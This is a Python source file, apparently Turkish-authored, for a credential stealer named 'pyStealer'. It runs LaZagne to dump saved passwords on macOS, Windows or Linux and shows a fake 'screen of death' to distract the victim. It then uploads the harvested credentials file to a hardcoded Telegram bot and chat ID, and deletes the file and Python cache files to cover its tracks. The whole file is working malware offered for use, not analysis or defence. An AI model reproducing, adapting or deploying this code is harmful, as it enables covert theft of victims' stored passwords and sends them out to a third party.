# Bu araç @keyiflerolsun tarafından | @KekikAkademi için yazılmıştır.

import warnings, os, platform, subprocess
from telebot import TeleBot

warnings.filterwarnings("ignore")
warnings.simplefilter(action="ignore")

try:
    kullanici_adi = os.getlogin()
except OSError:
    import pwd
    kullanici_adi = pwd.getpwuid(os.geteuid())[0]

bilgisayar_adi = platform.node()
oturum         = f"{kullanici_adi}@{bilgisayar_adi}"
hedef_sistem   = platform.system()

def pyStealer(bot_token:str="1205885111:AAEHH1y7BoR4WmRHmOdJVEk2Ai30lhuvukw", chat_id:int=717569643):
    tg_botumuz = TeleBot(bot_token, parse_mode="Markdown")

    try:
        if hedef_sistem == "Darwin":
            mavi = subprocess.Popen('python3 pyStealer/MaviEkran/screen_of_death.py', shell=True)
            os.system("python3 pyStealer/Mac/laZagne.py")
            os.system('''find . | grep -E "(__pycache__|\.pyc|\.pyo$)" | xargs rm -rf''')
            os.system("clear")
        elif hedef_sistem == "Windows":
            mavi = subprocess.Popen('python pyStealer/MaviEkran/screen_of_death.py', shell=False)
            subprocess.run('python pyStealer/Windows/laZagne.py', shell=False)
            os.system("cls")
            os.system('''python -Bc "import pathlib; [p.unlink() for p in pathlib.Path('.').rglob('*.py[co]')]"''')
            os.system('''python -Bc "import pathlib; [p.rmdir() for p in pathlib.Path('.').rglob('__pycache__')]"''')
            os.system('''python -Bc "import pathlib; [p.unlink() for p in pathlib.Path('.').rglob('*.bak')]''')
        elif hedef_sistem == "Linux":
            mavi = subprocess.Popen('python3 pyStealer/MaviEkran/screen_of_death.py', shell=True)
            os.system("python3 pyStealer/Linux/laZagne.py")
            os.system("clear")
            os.system('''find . | grep -E "(__pycache__|\.pyc|\.pyo$)" | xargs rm -rf''')

        DIZ_DATA = f"{oturum}.json"

        with open(DIZ_DATA, "rb") as DIZ:
            tg_botumuz.send_document(chat_id, DIZ, caption=f"*{hedef_sistem}* _:_ `{oturum}`")

        os.remove(DIZ_DATA)
    except Exception:
        pass
    finally:
        mavi.terminate()